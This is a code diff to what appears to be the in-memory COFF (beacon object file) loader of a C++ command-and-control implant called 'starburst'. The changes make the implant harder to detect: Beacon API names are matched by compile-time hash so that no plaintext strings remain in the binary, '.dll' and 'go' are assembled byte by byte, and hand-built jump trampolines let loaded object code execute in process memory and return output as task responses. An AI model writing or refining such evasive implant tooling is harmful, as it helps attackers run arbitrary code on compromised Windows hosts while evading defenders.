@@ -256,34 +256,42 @@ static void __cdecl declfn beacon_cleanup_thread( void* ctx ) {
 
 } // extern "C"
 
+// FNV-1a hash for compile-time beacon API name matching
+static constexpr uint32_t _fnv1a( const char* s ) {
+    uint32_t h = 0x811c9dc5;
+    while ( *s ) { h ^= (uint8_t)*s++; h *= 0x01000193; }
+    return h;
+}
+
+static auto declfn _hash_name( const char* s ) -> uint32_t {
+    uint32_t h = 0x811c9dc5;
+    while ( *s ) { h ^= (uint8_t)*s++; h *= 0x01000193; }
+    return h;
+}
+
 static auto declfn resolve_coff_symbol(
     instance& inst, const char* name
 ) -> void* {
-    struct { const char* n; void* a; } beacon_apis[] = {
-        { "BeaconPrintf",           (void*)beacon_printf },
-        { "BeaconOutput",           (void*)beacon_output },
-        { "BeaconDataParse",        (void*)beacon_data_parse },
-        { "BeaconDataInt",          (void*)beacon_data_int },
-        { "BeaconDataShort",        (void*)beacon_data_short },
-        { "BeaconDataExtract",      (void*)beacon_data_extract },
-        { "BeaconDataLength",       (void*)beacon_data_length },
-        { "BeaconFormatAlloc",      (void*)beacon_format_alloc },
-        { "BeaconFormatReset",      (void*)beacon_format_reset },
-        { "BeaconFormatFree",       (void*)beacon_format_free },
-        { "BeaconFormatAppend",     (void*)beacon_format_append },
-        { "BeaconFormatPrintf",     (void*)beacon_format_printf },
-        { "BeaconFormatToString",   (void*)beacon_format_tostring },
-        { "BeaconFormatInt",        (void*)beacon_format_int },
-        { "BeaconIsAdmin",          (void*)beacon_is_admin },
-        { "BeaconGetSpawnTo",       (void*)beacon_get_spawn_to },
-        { "BeaconCleanupProcess",   (void*)beacon_cleanup_thread },
-        { nullptr, nullptr }
-    };
-
-    for ( int i = 0; beacon_apis[i].n; i++ ) {
-        if ( str_cmp( const_cast<char*>(name), symbol<char*>(const_cast<char*>(beacon_apis[i].n)) ) == 0 ) {
-            return beacon_apis[i].a;
-        }
+    // match beacon API names by hash - no plaintext strings in binary
+    uint32_t h = _hash_name( name );
+    switch ( h ) {
+        case _fnv1a("BeaconPrintf"):           return (void*)beacon_printf;
+        case _fnv1a("BeaconOutput"):           return (void*)beacon_output;
+        case _fnv1a("BeaconDataParse"):        return (void*)beacon_data_parse;
+        case _fnv1a("BeaconDataInt"):          return (void*)beacon_data_int;
+        case _fnv1a("BeaconDataShort"):        return (void*)beacon_data_short;
+        case _fnv1a("BeaconDataExtract"):      return (void*)beacon_data_extract;
+        case _fnv1a("BeaconDataLength"):       return (void*)beacon_data_length;
+        case _fnv1a("BeaconFormatAlloc"):      return (void*)beacon_format_alloc;
+        case _fnv1a("BeaconFormatReset"):      return (void*)beacon_format_reset;
+        case _fnv1a("BeaconFormatFree"):       return (void*)beacon_format_free;
+        case _fnv1a("BeaconFormatAppend"):     return (void*)beacon_format_append;
+        case _fnv1a("BeaconFormatPrintf"):     return (void*)beacon_format_printf;
+        case _fnv1a("BeaconFormatToString"):   return (void*)beacon_format_tostring;
+        case _fnv1a("BeaconFormatInt"):        return (void*)beacon_format_int;
+        case _fnv1a("BeaconIsAdmin"):          return (void*)beacon_is_admin;
+        case _fnv1a("BeaconGetSpawnTo"):       return (void*)beacon_get_spawn_to;
+        case _fnv1a("BeaconCleanupProcess"):   return (void*)beacon_cleanup_thread;
     }
 
     char mod_name[64] = { 0 };
@@ -294,9 +302,11 @@ static auto declfn resolve_coff_symbol(
 
     if ( *dollar == '$' ) {
         uint32_t mod_len = (uint32_t)(dollar - name);
-        if ( mod_len < 63 ) {
+        if ( mod_len < 59 ) {
             memory::copy( mod_name, const_cast<char*>(name), mod_len );
-            str_concat( mod_name, symbol<char*>( const_cast<char*>( ".dll" ) ) );
+            mod_name[mod_len] = '.'; mod_name[mod_len+1] = 'd';
+            mod_name[mod_len+2] = 'l'; mod_name[mod_len+3] = 'l';
+            mod_name[mod_len+4] = '\0';
         }
         uint32_t func_len = str_len( const_cast<char*>( dollar + 1 ) );
         if ( func_len < 127 ) {
@@ -340,7 +350,7 @@ auto declfn starburst::cmd_execute_coff(
     if ( entry_name && entry_len > 0 ) {
         memory::copy( entry_buf, entry_name, entry_len < 63 ? entry_len : 63 );
     } else {
-        str_copy( entry_buf, symbol<char*>( const_cast<char*>( "go" ) ) );
+        entry_buf[0] = 'g'; entry_buf[1] = 'o'; entry_buf[2] = '\0';
     }
 
     DBG_PRINT( inst, "cmd_execute_coff: %u bytes, entry=%s, args=%u bytes\n",
@@ -362,25 +372,34 @@ auto declfn starburst::cmd_execute_coff(
         return;
     }
 
+    // calculate total size: all sections (16-byte aligned) + trampoline space
+    // trampolines: 12 bytes each (mov rax,imm64 + jmp rax), one per symbol max
+    uint32_t total_alloc = 0;
+    uint32_t sec_offsets[256] = { 0 };
+    uint32_t sec_sizes[256] = { 0 };
+    for ( uint16_t i = 0; i < header->NumberOfSections && i < 256; i++ ) {
+        sec_offsets[i] = total_alloc;
+        sec_sizes[i] = sections[i].SizeOfRawData;
+        if ( sec_sizes[i] == 0 ) sec_sizes[i] = sections[i].VirtualSize;
+        if ( sec_sizes[i] == 0 ) sec_sizes[i] = 64;
+        total_alloc += ( sec_sizes[i] + 15 ) & ~15u;
+    }
+    uint32_t tramp_offset = total_alloc;
+    total_alloc += header->NumberOfSymbols * 12;
+
+    auto coff_base = static_cast<uint8_t*>(
+        inst.kernel32.VirtualAlloc(
+            nullptr, total_alloc,
+            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) );
+    if ( !coff_base ) {
+        inst.heap_free( section_ptrs );
+        queue_response( inst, task_uuid, RESPONSE_ERROR,
+            symbol<char*>( const_cast<char*>( "section alloc failed" ) ) );
+        return;
+    }
+
     for ( uint16_t i = 0; i < header->NumberOfSections; i++ ) {
-        uint32_t sec_size = sections[i].SizeOfRawData;
-        if ( sec_size == 0 ) sec_size = sections[i].VirtualSize;
-        if ( sec_size == 0 ) sec_size = 64;
-
-        section_ptrs[i] = static_cast<uint8_t*>(
-            inst.kernel32.VirtualAlloc(
-                nullptr, sec_size,
-                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) );
-
-        if ( !section_ptrs[i] ) {
-            for ( uint16_t j = 0; j < i; j++ )
-                inst.kernel32.VirtualFree( section_ptrs[j], 0, MEM_RELEASE );
-            inst.heap_free( section_ptrs );
-            queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "section alloc failed" ) ) );
-            return;
-        }
-
+        section_ptrs[i] = coff_base + sec_offsets[i];
         if ( sections[i].SizeOfRawData > 0 ) {
             memory::copy( section_ptrs[i],
                 coff_data + sections[i].PointerToRawData,
@@ -388,12 +407,26 @@ auto declfn starburst::cmd_execute_coff(
         }
     }
 
+    auto tramp_ptr = coff_base + tramp_offset;
+    uint32_t tramp_used = 0;
+
     auto func_ptrs = static_cast<void**>(
         inst.heap_alloc( header->NumberOfSymbols * sizeof(void*) ) );
     if ( !func_ptrs ) {
-        for ( uint16_t i = 0; i < header->NumberOfSections; i++ )
-            inst.kernel32.VirtualFree( section_ptrs[i], 0, MEM_RELEASE );
+        inst.kernel32.VirtualFree( coff_base, 0, MEM_RELEASE );
         inst.heap_free( section_ptrs );
+        queue_response( inst, task_uuid, RESPONSE_ERROR,
+            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+        return;
+    }
+
+    // IAT for __imp_ symbols: code does indirect calls through these pointers
+    auto imp_table = static_cast<void**>(
+        inst.heap_alloc( header->NumberOfSymbols * sizeof(void*) ) );
+    if ( !imp_table ) {
+        inst.kernel32.VirtualFree( coff_base, 0, MEM_RELEASE );
+        inst.heap_free( section_ptrs );
+        inst.heap_free( func_ptrs );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
         return;
@@ -420,7 +453,26 @@ auto declfn starburst::cmd_execute_coff(
                 entry_ptr = func_ptrs[i];
             }
         } else if ( symbols[i].SectionNumber == 0 && symbols[i].StorageClass == 2 ) {
-            func_ptrs[i] = resolve_coff_symbol( inst, sym_name );
+            bool is_imp = sym_name[0] == '_' && sym_name[1] == '_' &&
+                          sym_name[2] == 'i' && sym_name[3] == 'm' &&
+                          sym_name[4] == 'p' && sym_name[5] == '_';
+            void* resolved = resolve_coff_symbol( inst, sym_name );
+            if ( is_imp && resolved ) {
+                imp_table[i] = resolved;
+                func_ptrs[i] = &imp_table[i];
+            } else if ( resolved ) {
+                // non-__imp_ external: create trampoline (mov rax,addr; jmp rax)
+                // so REL32 relocations stay within ±2GB of BOF sections
+                auto t = tramp_ptr + tramp_used * 12;
+                t[0] = 0x48; t[1] = 0xB8;
+                *reinterpret_cast<uint64_t*>( t + 2 ) =
+                    reinterpret_cast<uint64_t>( resolved );
+                t[10] = 0xFF; t[11] = 0xE0;
+                func_ptrs[i] = t;
+                tramp_used++;
+            } else {
+                func_ptrs[i] = nullptr;
+            }
         } else {
             func_ptrs[i] = nullptr;
         }
@@ -429,10 +481,10 @@ auto declfn starburst::cmd_execute_coff(
     }
 
     if ( !entry_ptr ) {
-        for ( uint16_t i = 0; i < header->NumberOfSections; i++ )
-            inst.kernel32.VirtualFree( section_ptrs[i], 0, MEM_RELEASE );
+        inst.kernel32.VirtualFree( coff_base, 0, MEM_RELEASE );
         inst.heap_free( section_ptrs );
         inst.heap_free( func_ptrs );
+        inst.heap_free( imp_table );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "entry point not found" ) ) );
         return;
@@ -488,15 +540,18 @@ auto declfn starburst::cmd_execute_coff(
         }
     }
 
-    // set .text sections to RX
+    // set .text sections and trampoline area to RX
     for ( uint16_t i = 0; i < header->NumberOfSections; i++ ) {
         if ( sections[i].Characteristics & 0x20000000 ) {
             DWORD old_protect;
-            uint32_t sec_size = sections[i].SizeOfRawData;
-            if ( sec_size == 0 ) sec_size = sections[i].VirtualSize;
-            inst.kernel32.VirtualProtect( section_ptrs[i], sec_size,
+            inst.kernel32.VirtualProtect( section_ptrs[i], sec_sizes[i],
                 PAGE_EXECUTE_READ, &old_protect );
         }
+    }
+    if ( tramp_used > 0 ) {
+        DWORD old_protect;
+        inst.kernel32.VirtualProtect( tramp_ptr, tramp_used * 12,
+            PAGE_EXECUTE_READ, &old_protect );
     }
 
     // setup COFF output via instance
@@ -511,8 +566,8 @@ auto declfn starburst::cmd_execute_coff(
 
     // execute entry point: void go(char* args, int len)
     typedef void ( __cdecl *bof_entry )( char*, int );
-    auto go = reinterpret_cast<bof_entry>( entry_ptr );
-    go( reinterpret_cast<char*>( args_data ), args_len );
+    auto go_fn = reinterpret_cast<bof_entry>( entry_ptr );
+    go_fn( reinterpret_cast<char*>( args_data ), args_len );
 
     // restore ArbitraryUserPointer
     coff_set_inst( old_aup );
@@ -522,18 +577,17 @@ auto declfn starburst::cmd_execute_coff(
         queue_response( inst, task_uuid, RESPONSE_SUCCESS, inst.coff.output_data );
     } else {
         queue_response( inst, task_uuid, RESPONSE_SUCCESS,
-            symbol<char*>( const_cast<char*>( "BOF executed (no output)" ) ) );
+            symbol<char*>( const_cast<char*>( "executed (no output)" ) ) );
     }
 
     // cleanup
     if ( inst.coff.output_data ) inst.heap_free( inst.coff.output_data );
     inst.coff = { nullptr, 0, 0 };
 
-    for ( uint16_t i = 0; i < header->NumberOfSections; i++ ) {
-        inst.kernel32.VirtualFree( section_ptrs[i], 0, MEM_RELEASE );
-    }
+    inst.kernel32.VirtualFree( coff_base, 0, MEM_RELEASE );
     inst.heap_free( section_ptrs );
     inst.heap_free( func_ptrs );
+    inst.heap_free( imp_table );
 }
 
 #endif
